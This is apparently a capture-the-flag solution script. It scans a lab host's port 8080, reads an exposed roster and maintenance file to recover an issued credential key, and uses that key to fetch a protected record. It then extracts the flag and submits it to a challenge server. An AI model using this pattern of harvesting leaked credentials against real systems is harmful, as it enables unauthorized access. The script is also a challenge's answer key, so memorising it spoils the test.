#!/bin/sh
set -eu

HOST=172.20.0.141
BASE="http://${HOST}:8080"

nmap -n -p 8080 --open "$HOST" | grep -q '8080/tcp open'

roster=$(curl -fsS "$BASE/public/roster.json")
maintenance=$(curl -fsS "$BASE/archive/maintenance.ini")
active_id=$(printf '%s\n' "$maintenance" | sed -n 's/^active_credential_id=//p')
key=$(printf '%s' "$roster" | python3 -c 'import json,sys; d=json.load(sys.stdin); wanted=sys.argv[1]; print(next(x["key"] for x in d["issued_credentials"] if x["id"]==wanted))' "$active_id")
response=$(curl -fsS -H "X-Station-Key: $key" "$BASE/console/record")
flag=$(printf '%s' "$response" | python3 -c 'import json,sys; print(json.load(sys.stdin)["flag"])')
payload=$(python3 -c 'import json,sys; print(json.dumps({"challenge_id":"scl-challenge-frame-8d9391","task_id":"task1","flag":sys.argv[1]}))' "$flag")
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "$payload"
